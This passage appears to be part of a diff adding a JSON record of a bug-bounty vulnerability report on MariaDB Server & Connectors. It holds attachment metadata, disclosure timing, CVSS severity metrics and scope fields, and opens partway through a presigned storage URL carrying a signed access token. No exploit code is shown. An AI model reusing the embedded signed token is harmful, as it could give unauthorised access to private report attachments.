Sq7C%2FKYmfc8t8CkcOogdXiE37AzYQt41dlmGKrgDe4%2Fw%2FsFa6sl0sdOo4iszk6jtGfQZu3%2Fw4PDPeHHF8vdKKh4fU8aT57IirWv2mZSojlny7Dq0fRi0Qh3MwRUXIQBK8z5qc0zd5Pr8%2BjHmNvalR84W6YLtaLp9o6VBGvxTQGb%2BVUED8hN9UXkxR1lOzahOTV%2ByeuRlpD01%2BHdBljwD9uwDZP6MCgl0KYuGsj%2FSxNIs6gckY399oV32MNbp%2BPu1jbEYYu8GvpY8md26qODe%2BVaXlDHVNpe8mlstYJHPPg%2BrU8kAJuS8nTf9bwCLrcjFhJ1tqJiQct1kDHQHIAKXuXY3WyggQbR4WM3cEXF%2BzOr0LeJEIfrxVyyJiblAsID3XZp81J9Ce0RVPUUpwUjnKUd9HUFrYgDwchk5D6fyNkfiyA%2B4z7MIWZ0RQPnh4RQKdi2FQm8qVgsH%2FtbkSwUdhkjT5BCv1lO93rM7ZDuVdMyg520cOPhacND6%2FhVa5Kbgu13S%2F92mLhVIJois9x8OdTrjYa37wTDauazXBjqxAcUv7cxktVIfFDCXDuX%2BUOfh5LBpUspNJE8TPd089mx9xlH0O5fU5rHdjjPI%2BP4fRvQE4%2BgLQ%2Fy6ThQ6RZcyjTvR6slPqSDKvMi5bFzYndkIvgypLOYB1WHw1v6%2BAD8F%2B48p64LL6Ur%2BMOkdmvG%2Fakj3bR%2F47eyjTwpCoT2eZAu67cS3bYupId%2BMYz7upRP7B1dj43updYNW85%2BaksjK7m9l2bwV97p6l1NmL0Qg2ivS9Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5792e17ababee6c293e6a9fc8cbfd8cbebb8dbfab91a985e38bc337b251516d1",
+      "file_size": 658,
+      "type": "text/x-diff",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-12-04T11:17:17.241Z",
+  "allow_singular_disclosure_after": 2572334.003764818,
+  "singular_disclosure_allowed": false,
+  "vote_count": 1,
+  "voters": [
+    "fg0x0"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.9,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 10336,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "MariaDB Server & Connectors - Data corruption, exfiltration, disclosure",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": [],
+    "can_view_ave_report?": false
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
